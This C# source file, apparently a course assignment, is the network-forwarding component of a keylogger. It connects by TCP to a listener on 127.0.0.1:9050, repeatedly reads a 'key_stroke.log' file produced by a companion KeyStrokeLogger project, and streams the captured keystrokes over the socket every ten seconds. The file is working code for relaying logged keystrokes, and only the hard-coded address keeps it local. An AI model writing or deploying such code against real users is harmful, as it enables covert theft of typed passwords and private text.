using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace COMP_6700_Assignment1
{
    class ClassWork
    {
        public static void Main()
        {
            bool connected = false; 
            string data;
            IPEndPoint ipep = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9050);
            Socket server = null; 
            
            while(!connected)
            {

                try
                {
                    server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    Console.WriteLine("Attempting to connect...");
                    server.Connect(ipep);
                    connected = true;
                    Console.WriteLine("Connection Sucessful"); 
                }
                catch (SocketException e)
                {
                    Console.WriteLine("Unable to connect to server. Retrying in 5 seconds...");
                    server?.Close();
                    Thread.Sleep(5000);
                }

            }
         
            // Go up 4 levels to reach the shared root directory and navigate into the other project folder and find the file
            string exePath = AppDomain.CurrentDomain.BaseDirectory;
            string sharedRoot = Directory.GetParent(exePath).Parent.Parent.Parent.FullName;
            string filePath = Path.Combine(sharedRoot, "KeyStrokeLogger-master", "KeyStrokeLogger","bin","Debug", "key_stroke.log");  
            Console.WriteLine("Looking for file at: " + filePath);
            Console.WriteLine("File exists: " + File.Exists(filePath));

            // Creating objects for reading,writing from the files and a string builder object
            FileStream fs1 = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            NetworkStream ns = new NetworkStream(server);
            StringBuilder sb = new StringBuilder();
            StreamReader sr = new StreamReader(fs1);
            StreamWriter sw = new StreamWriter(ns);

            //Infinite loop in order to keep this program going indefinitely
            while (true)
            {
                //checks to see if the string reader is at the end of the file after 10 sec (i.e. more info is added to the file)
                if (sr.Peek() > -1)
                {
                    // Read all the info from the file
                    while (sr.Peek() > -1)
                    {
                        sb.Append(sr.ReadLine());
                    }

                    //Converts simple string to string builder object.
                    String input = sb.ToString();

                    //Avoids processing same data twice 
                    sb.Clear();

                    //Parsing the input and string the parsed info in p string array.
                    char[] h = { ',', '/', '*' };
                    String[] p;
                    p = input.Split(h);

                    //Showing the parsed data
                    for (int i = 0; i < p.Length; i++)
                    {
                        Console.WriteLine(p[i]);
                        //Writing it into a file
                        sw.WriteLine(p[i]);
                    }

                    //Flushes the buffer of the string writer to force an immediate output to the .txt file
                    sw.Flush();
                }
                sr.DiscardBufferedData(); //Gets rid of leftover data in the string reader
                Thread.Sleep(10000); //Wait 10 secs
            }
        }
    }
}

